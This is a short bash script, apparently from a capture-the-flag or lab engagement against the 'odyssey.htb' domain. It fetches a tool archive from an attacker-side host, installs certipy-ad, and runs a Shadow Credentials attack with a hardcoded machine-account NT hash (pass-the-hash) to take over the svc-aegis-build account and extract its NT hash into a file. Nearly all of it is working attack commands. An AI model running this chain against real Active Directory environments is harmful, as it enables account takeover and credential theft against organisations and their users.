#!/bin/bash
HASH="71bc6be8565f0c9871070c3912b1680d"
export PATH="$HOME/.local/bin:$PATH"
cd /tmp
if [ ! -d /tmp/adwheels ] || ! ls /tmp/adwheels/*.whl >/dev/null 2>&1; then
  curl -fsSL -o /tmp/adwheels.tgz http://10.10.15.183:8090/adwheels.tgz
  mkdir -p /tmp/adwheels
  tar -xzf /tmp/adwheels.tgz -C /tmp/adwheels
fi
ls /tmp/adwheels/*.whl | wc -l
python3 -m pip install --user --break-system-packages --no-index --find-links=/tmp/adwheels certipy-ad 2>&1 | tail -25
export PATH="$HOME/.local/bin:$PATH"
python3 -c 'import certipy; print("certipy", certipy.__file__)'
# find entrypoint
python3 -m certipy --help 2>&1 | head -5
# run shadow
python3 -m certipy shadow auto -u 'ODYSSEY-DB$@odyssey.htb' -hashes ":$HASH" -account svc-aegis-build -dc-ip 172.16.0.10 2>&1 | tee /tmp/certipy_shadow.out
grep -i 'NT hash' /tmp/certipy_shadow.out | tee /tmp/build_hash.txt
echo SHADOW3_END
